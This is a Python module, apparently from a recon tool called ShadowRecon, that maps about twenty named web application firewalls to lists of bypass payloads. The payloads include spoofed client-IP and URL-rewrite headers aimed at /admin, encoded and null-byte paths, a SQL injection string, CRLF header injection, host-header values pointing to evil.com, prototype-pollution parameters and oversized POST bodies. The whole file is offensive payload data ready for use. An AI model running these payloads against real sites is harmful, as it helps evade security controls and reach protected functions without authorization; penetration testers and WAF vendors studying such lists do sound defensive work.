"""
WAF-bypass payload registry.

These payload sets are PRESERVED VERBATIM from the original ShadowRecon
`main.py`. They were moved here only to separate data from framework code and
to replace the original `globals()[func]` dynamic dispatch with an explicit
registry. Nothing was added, sharpened, or made more effective.

Each builder takes the target URL and returns a list of payload dicts:
    {"desc": str, "url"?: str, "method"?: str, "headers"?: dict, "data"?: str}
"""
from urllib.parse import urlparse


def mutate_path(url: str, new_segment: str) -> str:
    p = urlparse(url)
    new_path = "/" + new_segment.strip("/") + "/" + p.path.lstrip("/")
    return p._replace(path=new_path).geturl()


def cloudflare(url):
    return [
        {"desc": "X-Forwarded-For: 127.0.0.1", "headers": {"X-Forwarded-For": "127.0.0.1"}},
        {"desc": "User-Agent: Googlebot", "headers": {"User-Agent": "Googlebot"}},
        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
        {"desc": "Double encoded slash", "url": url.replace("/", "/%252F/")},
        {"desc": "Nullbyte at end", "url": url + "%2500"},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "Big POST body", "method": "POST", "data": "Z" * 8000},
        {"desc": "Extra Query param", "url": url + "?q=<test-tag>"},
        {"desc": "Multiple params", "url": url + "?id=1&id=1"},
        {"desc": "X-Original-URL", "headers": {"X-Original-URL": "/admin"}},
        {"desc": "X-Rewrite-URL", "headers": {"X-Rewrite-URL": "/admin"}},
        {"desc": "Forwarded header with host", "headers": {"Forwarded": "for=127.0.0.1;host=evil.com"}},
        {"desc": "X-Forwarded-Host: evil.com", "headers": {"X-Forwarded-Host": "evil.com"}},
    ]


def modsecurity(url):
    return [
        {"desc": "SQLi param", "url": url + "?id=1' OR '1'='1"},
        {"desc": "Encoded path %27", "url": mutate_path(url, "%27")},
        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
        {"desc": "Content-Type: text/xml", "headers": {"Content-Type": "text/xml"}},
        {"desc": "POST JSON", "method": "POST", "data": '{"foo":"bar"}', "headers": {"Content-Type": "application/json"}},
        {"desc": "Multipart POST", "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
         "data": "--boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\ndata\r\n--boundary--"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "TRACE method", "method": "TRACE"},
    ]


def incapsula(url):
    return [
        {"desc": "X-Real-IP header", "headers": {"X-Real-IP": "127.0.0.1"}},
        {"desc": "Client-IP header", "headers": {"X-Client-IP": "127.0.0.4"}},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Big POST", "method": "POST", "data": "A" * 6000},
        {"desc": "X-Forwarded-Host", "headers": {"X-Forwarded-Host": "evil.com"}},
        {"desc": "Param base64", "url": url + "?user=YWRtaW4="},
    ]


def sucuri(url):
    return [
        {"desc": "X-Forwarded-For: 8.8.8.8", "headers": {"X-Forwarded-For": "8.8.8.8"}},
        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
        {"desc": "Extra /./", "url": url + "/./"},
        {"desc": "Query test", "url": url + "?test=1"},
        {"desc": "Unicode param name", "url": url + "?％61d=admin"},
        {"desc": "SOAPAction header", "headers": {"SOAPAction": "adminLogin"}},
        {"desc": "Big POST", "method": "POST", "data": "SUCURI" * 2000},
    ]


def barracuda(url):
    return [
        {"desc": "Encoded path (%20)", "url": mutate_path(url, "%20")},
        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
        {"desc": "Nullbyte %00", "url": url + "%2500"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "CRLF X-Header", "headers": {"X-Header": "foo\r\nbar: evil"}},
    ]


def aws(url):
    return [
        {"desc": "Query pollution", "url": url + "?a=1&a=2"},
        {"desc": "Big POST", "method": "POST", "data": "X" * 35000},
        {"desc": "User-Agent: curl", "headers": {"User-Agent": "curl/7.85.0"}},
        {"desc": "Encoded path (%25)", "url": mutate_path(url, "%25")},
    ]


def f5(url):
    return [
        {"desc": "X-Forwarded-For header", "headers": {"X-Forwarded-For": "127.0.0.2"}},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "Encoded path (%2f)", "url": mutate_path(url, "%2f")},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Delete method", "method": "DELETE"},
    ]


def akamai(url):
    return [
        {"desc": "User-Agent Edge", "headers": {"User-Agent": "Edge"}},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Random param", "url": url + "?akamai=1"},
    ]


def fortiweb(url):
    return [
        {"desc": "IPv6 X-Forwarded-For", "headers": {"X-Forwarded-For": "::1"}},
        {"desc": "Encoded path (%2e)", "url": mutate_path(url, "%2e")},
        {"desc": "POST big", "method": "POST", "data": "A" * 10000},
        {"desc": "PATCH method", "method": "PATCH"},
    ]


def sophos(url):
    return [
        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
        {"desc": "User-Agent: SophosTest", "headers": {"User-Agent": "SophosTest"}},
        {"desc": "Extra param", "url": url + "?sophos=1"},
        {"desc": "Forwarded header", "headers": {"Forwarded": "for=8.8.8.8"}},
    ]


def azure(url):
    return [
        {"desc": "Referer: office.com", "headers": {"Referer": "https://office.com"}},
        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
        {"desc": "Big POST", "method": "POST", "data": "B" * 10000},
    ]


def sitelock(url):
    return [
        {"desc": "User-Agent: SiteLockScanner", "headers": {"User-Agent": "SiteLockScanner"}},
        {"desc": "Big param", "url": url + "?sitelock=" + "A" * 500},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "__proto__ param", "url": url + "?__proto__=1"},
    ]


def stackpath(url):
    return [
        {"desc": "X-Client-IP header", "headers": {"X-Client-IP": "4.4.4.4"}},
        {"desc": "Big POST", "method": "POST", "data": "Stack" * 2000},
        {"desc": "Forwarded Host", "headers": {"X-Forwarded-Host": "test.com"}},
    ]


def radware(url):
    return [
        {"desc": "X-Radware header", "headers": {"X-Radware": "test"}},
        {"desc": "Random param", "url": url + "?radware=1"},
        {"desc": "Encoded param", "url": url + "?radware=%2e"},
    ]


def citrix(url):
    return [
        {"desc": "X-Citrix header", "headers": {"X-Citrix": "test"}},
        {"desc": "Encoded param", "url": url + "?citrix=%2e%2e"},
    ]


def wallarm(url):
    return [
        {"desc": "X-Wallarm header", "headers": {"X-Wallarm": "test"}},
        {"desc": "POST /wallarm", "method": "POST", "data": "WALLARM"},
        {"desc": "Trace method", "method": "TRACE"},
    ]


def apptrana(url):
    return [
        {"desc": "X-IndusGuard header", "headers": {"X-IndusGuard": "true"}},
        {"desc": "Param test", "url": url + "?apptrana=1"},
        {"desc": "Big POST", "method": "POST", "data": "INDUS" * 400},
    ]


def reblaze(url):
    return [
        {"desc": "X-Reblaze header", "headers": {"X-Reblaze": "test"}},
        {"desc": "Encoded param", "url": url + "?reblaze=%2e"},
        {"desc": "XML param", "url": url + "?xml=%3Ctest%3E"},
    ]


def safedog(url):
    return [
        {"desc": "X-SafeDog header", "headers": {"X-SafeDog": "test"}},
        {"desc": "Random param", "url": url + "?safedog=1"},
        {"desc": "Encoded param", "url": url + "?safe=%2e"},
    ]


def naxsi(url):
    return [
        {"desc": "X-NAXSI header", "headers": {"X-NAXSI": "test"}},
        {"desc": "Encoded param", "url": url + "?naxsi=%2e%2e"},
    ]


def default_payloads(url):
    return [
        {"desc": "Simple GET", "headers": {}},
        {"desc": "HEAD method", "method": "HEAD"},
        {"desc": "OPTIONS method", "method": "OPTIONS"},
        {"desc": "Extra param in GET", "url": url + "?debug=1"},
        {"desc": "PATCH method", "method": "PATCH"},
        {"desc": "User-Agent: Generic bot", "headers": {"User-Agent": "BROKEN-TOOL-XYZ/1.0"}},
    ]


# WAF name (as reported by wafw00f) -> payload builder.
# Replaces the original waf_map + globals() lookup with explicit references.
BYPASS = {
    "Cloudflare": cloudflare,
    "ModSecurity": modsecurity,
    "Incapsula": incapsula,
    "Sucuri": sucuri,
    "Barracuda": barracuda,
    "AWS Elastic Load Balancer": aws,
    "BIG-IP": f5,
    "Kona SiteDefender": akamai,
    "FortiWeb": fortiweb,
    "Sophos": sophos,
    "Azure Application Gateway": azure,
    "SiteLock": sitelock,
    "StackPath": stackpath,
    "AppWall": radware,
    "NetScaler": citrix,
    "Wallarm": wallarm,
    "IndusGuard": apptrana,
    "Reblaze": reblaze,
    "SafeDog": safedog,
    "NAXSI": naxsi,
}
